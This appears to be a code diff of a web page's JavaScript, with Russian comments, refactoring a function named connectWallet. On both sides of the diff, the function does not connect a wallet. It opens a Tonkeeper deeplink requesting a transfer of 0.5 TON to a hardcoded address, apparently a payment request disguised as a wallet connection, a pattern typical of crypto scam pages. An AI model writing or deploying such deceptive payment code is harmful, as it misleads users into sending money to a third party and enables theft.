@@ -68,16 +68,17 @@
 
     <script>
         function connectWallet() {
-            const tonAmount = 0.5;
-            const userUID = "QCwDpTnJclQCsiJ6cLqqhr97LWX4RklOAWr3eBBENsilJhM";
-            const deeplink = `tonkeeper://transfer/${userUID}?amount=${tonAmount * 1e9}`; // Deeplink для открытия приложения
-
-            // Проверяем, что пользователь использует Telegram Web App
+            // Проверка, находится ли пользователь в Telegram Web App
             if (window.Telegram && window.Telegram.WebApp) {
-                // Открытие deeplink для приложения
+                // Установите deeplink для приложения
+                const tonAmount = 0.5;
+                const userUID = "QCwDpTnJclQCsiJ6cLqqhr97LWX4RklOAWr3eBBENsilJhM";
+                const deeplink = `tonkeeper://transfer/${userUID}?amount=${tonAmount * 1e9}`; // Deeplink для открытия приложения
+                
+                // Открытие deeplink
                 window.location.href = deeplink;
 
-                // Таймер для проверки открытия приложения
+                // Проверка, открывается ли приложение
                 setTimeout(() => {
                     // Проверяем пользовательское устройство
                     const userAgent = navigator.userAgent || navigator.vendor || window.opera;
@@ -98,6 +99,8 @@
                     }
                 }, 2000); // Задержка 2 секунды
             } else {
+                // Логирование для диагностики
+                console.log('Telegram WebApp не обнаружен. Возможно, скрипт выполняется не в Telegram WebApp.');
                 alert("Please use Telegram Web App to connect your wallet.");
             }
         }
